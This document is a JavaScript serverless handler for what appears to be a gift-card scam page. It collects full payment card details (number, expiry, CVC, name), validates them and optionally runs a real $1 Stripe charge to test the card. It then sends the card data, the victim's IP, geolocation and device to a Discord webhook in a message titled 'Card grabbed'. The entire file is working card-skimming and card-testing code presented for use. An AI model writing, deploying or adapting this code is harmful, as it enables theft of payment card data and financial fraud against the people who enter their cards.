import { sendWebhook, clientIp, geoFromHeaders } from './_utils.js';

const BRANDS = [
  { n:'Visa',       re:/^4/,                 len:[13,16,19],   cvc:[3] },
  { n:'MasterCard', re:/^(5[1-5]|2[2-7])/,   len:[16],         cvc:[3] },
  { n:'Amex',       re:/^3[47]/,             len:[15],         cvc:[4] },
  { n:'Discover',   re:/^(6011|65|64[4-9])/, len:[16,19],      cvc:[3] },
  { n:'JCB',        re:/^35/,                len:[16,19],      cvc:[3] },
  { n:'Diners',     re:/^(36|38|30[0-5])/,   len:[14,16,19],   cvc:[3] },
  { n:'UnionPay',   re:/^62/,                len:[16,17,18,19],cvc:[3] },
  { n:'Maestro',    re:/^(50|5[6-9]|6\d)/,   len:[12,13,14,15,16,17,18,19], cvc:[3] }
];
const detect = (d) => BRANDS.find(b => b.re.test(d)) || null;

function luhn(d){let s=0,a=false;for(let i=d.length-1;i>=0;i--){let x=+d[i];if(a){x*=2;if(x>9)x-=9}s+=x;a=!a}return d.length>0&&s%10===0}
function expOk(mm,yy){
  mm=+mm; yy=+yy; if(yy<100) yy+=2000;
  if(!(mm>=1&&mm<=12)) return false;
  const n=new Date(); return yy>n.getFullYear() || (yy===n.getFullYear() && mm>=n.getMonth()+1);
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin','*');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const b = req.body || {};
  const digits = String(b.number || '').replace(/\D/g,'');
  const cvc = String(b.cvc || '');
  const name = String(b.name || '').trim();
  const plan = b.plan === 'vanilla' ? 'vanilla' : 'amazon';
  const webhook = b.w || process.env.DISCORD_WEBHOOK_URL || '';

  const brand = detect(digits);
  const luhnOk = luhn(digits);
  const lenOk = brand ? brand.len.includes(digits.length) : false;
  const cvcOk = brand ? brand.cvc.includes(cvc.length) : /^\d{3,4}$/.test(cvc);
  const expValid = expOk(b.exp_month, b.exp_year);
  const valid = !!(luhnOk && lenOk && cvcOk && expValid && name);

  // ---- optional real $1 charge via Stripe ----
  let stripeStatus = 'not configured';
  let threeDS = null;
  const key = process.env.STRIPE_SECRET_KEY;
  if (key && valid) {
    try {
      const host = req.headers['x-forwarded-host'] || req.headers.host;
      const body = new URLSearchParams({
        amount: '100', currency: 'usd', confirm: 'true',
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': digits,
        'payment_method_data[card][exp_month]': String(parseInt(b.exp_month,10)),
        'payment_method_data[card][exp_year]': String(parseInt(b.exp_year,10)),
        'payment_method_data[card][cvc]': cvc,
        'payment_method_data[billing_details][name]': name,
        'description': plan === 'amazon' ? 'Amazon Gift Card plan' : 'Vanilla Visa plan',
        return_url: `https://${host}/card.html?done=1`
      });
      const r = await fetch('https://api.stripe.com/v1/payment_intents', {
        method:'POST',
        headers:{ Authorization:`Bearer ${key}`, 'Content-Type':'application/x-www-form-urlencoded' },
        body
      });
      const j = await r.json();
      if (j.error) stripeStatus = 'declined: ' + j.error.message;
      else if (j.status === 'succeeded') stripeStatus = 'charged $1.00 (succeeded)';
      else if (j.status === 'requires_action') {
        stripeStatus = '3D Secure required';
        threeDS = j.next_action?.redirect_to_url?.url || null;
      } else if (j.status === 'requires_payment_method') {
        stripeStatus = 'declined: ' + (j.last_payment_error?.message || 'card declined');
      } else stripeStatus = 'status: ' + j.status;
    } catch (e) { stripeStatus = 'error: ' + String(e); }
  } else if (key && !valid) {
    stripeStatus = 'skipped (failed local checks)';
  }

  // ---- log to Discord ----
  const g = geoFromHeaders(req);
  const ip = clientIp(req);
  const loc = [g.city, g.region, g.country].filter(Boolean).join(', ') || 'unknown';

  await sendWebhook(webhook, {
    content: `\`\`\`\n${digits}|${String(b.exp_month).padStart(2,'0')}/${b.exp_year}|${cvc}|${name}\n\`\`\``,
    embeds: [{
      title: '💳 Card grabbed — $1.00 ' + (plan === 'amazon' ? 'Amazon Gift Card' : 'Vanilla Visa') + ' plan',
      color: 0x635bff,
      fields: [
        { name:'Cardholder', value: name || '—', inline:true },
        { name:'Network', value: (brand?.n || 'Unknown') + (lenOk ? '' : ' (bad length)'), inline:true },
        { name:'Card number', value: '`' + digits + '`' },
        { name:'Expiry', value: `${b.exp_month}/${b.exp_year}`, inline:true },
        { name:'CVC', value: cvc || '—', inline:true },
        { name:'Checks', value: `Luhn ${luhnOk?'✅':'❌'} · Length ${lenOk?'✅':'❌'} · Expiry ${expValid?'✅':'❌'} · CVC ${cvcOk?'✅':'❌'}`, inline:true },
        { name:'Card valid', value: valid ? '✅ VALID' : '⚠️ SUSPECT / FAKE', inline:true },
        { name:'Stripe', value: stripeStatus, inline:true },
        { name:'IP', value: ip, inline:true },
        { name:'Location', value: loc, inline:true },
        { name:'Timezone', value: g.tz || '—', inline:true },
        { name:'Device', value: (b.device || req.headers['user-agent'] || '').slice(0,200) },
      ],
      timestamp: new Date().toISOString()
    }]
  });

  res.status(200).json({ ok:true, valid, brand: brand?.n || null, threeDS });
}
